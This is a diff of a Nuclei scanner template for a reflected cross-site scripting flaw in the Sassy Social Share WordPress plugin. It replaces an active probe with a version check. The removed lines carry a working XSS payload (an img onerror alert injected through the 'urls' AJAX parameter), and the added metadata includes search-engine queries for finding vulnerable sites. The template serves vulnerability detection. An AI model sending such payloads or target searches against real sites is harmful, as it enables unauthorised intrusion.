@@ -1,44 +1,59 @@
-id: sassy-social-share-xss
+id: sassy-social-share-84a5eedc2c7c295c35500bc62a8396d6
 
 info:
-  name: Sassy Social Share <=3.3.3 - Cross-Site Scripting
-  author: Random_Robbie
+  name: >
+    Sassy Social Share <= 3.3.3 - Reflected Cross-Site Scripting
+  author: topscoder
   severity: medium
-  description: |
-    WordPress Sassy Social Share 3.3.3 and prior is vulnerable to cross-site scripting because certain AJAX endpoints return JSON data with no Content-Type header set and then use the default text/html. In other words, any JSON that has HTML will be rendered as such.
+  description: >
+    The Sassy Social Share plugin for WordPress is vulnerable to Reflected Cross-Site Scripting via the 'urls' parameter called via the 'heateor_sss_sharing_count' AJAX action in versions up to, and including, 3.3.3 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that execute if they can successfully trick a user into performing an action such as clicking on a link.
   reference:
-    - https://wpscan.com/vulnerability/4631519b-2060-43a0-b69b-b3d7ed94c705
+    - https://github.com/topscoder/nuclei-wordfence-cve
+    - https://www.wordfence.com/threat-intel/vulnerabilities/id/85277960-2bba-4cd7-9f4c-e04f6743b96c?source=api-prod
   classification:
-    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
-    cvss-score: 5.4
-    cwe-id: CWE-80
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cve-id: 
   metadata:
-    max-request: 1
-  tags: xss,wp,wpscan,wordpress,wp-plugin,sassy
+    fofa-query: "wp-content/plugins/sassy-social-share/"
+    google-query: inurl:"/wp-content/plugins/sassy-social-share/"
+    shodan-query: 'vuln:'
+  tags: cve,wordpress,wp-plugin,sassy-social-share,medium
 
 http:
   - method: GET
+    redirects: true
+    max-redirects: 3
     path:
-      - "{{BaseURL}}/wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[%3Cimg%20src%3dx%20onerror%3dalert(document.domain)%3E]="
+      - "{{BaseURL}}/wp-content/plugins/sassy-social-share/readme.txt"
+
+    extractors:
+      - type: regex
+        name: version
+        part: body
+        group: 1
+        internal: true
+        regex:
+          - "(?mi)Stable tag: ([0-9.]+)"
+
+      - type: regex
+        name: version
+        part: body
+        group: 1
+        regex:
+          - "(?mi)Stable tag: ([0-9.]+)"
 
     matchers-condition: and
     matchers:
-      - type: word
-        part: body
-        words:
-          - '[{"<img src=x onerror=alert(document.domain)>":""}]'
-          - 'facebook'
-          - 'twitter'
-        condition: and
-
-      - type: word
-        part: header
-        words:
-          - 'application/json'
-        negative: true
-
       - type: status
         status:
           - 200
 
-# digest: 4a0a00473045022066a03d004dca2d05d4b9ee2a94be46123b3fd6524e8224427d50106f600f6fbd022100b9f020ba9476183e1fe1001b1668bf97a030db3cbd8a578679f532b8f04e4cbb:922c64590222798bb761d5b6d8e72950
+      - type: word
+        words:
+          - "sassy-social-share"
+        part: body
+
+      - type: dsl
+        dsl:
+          - compare_versions(version, '<= 3.3.3')
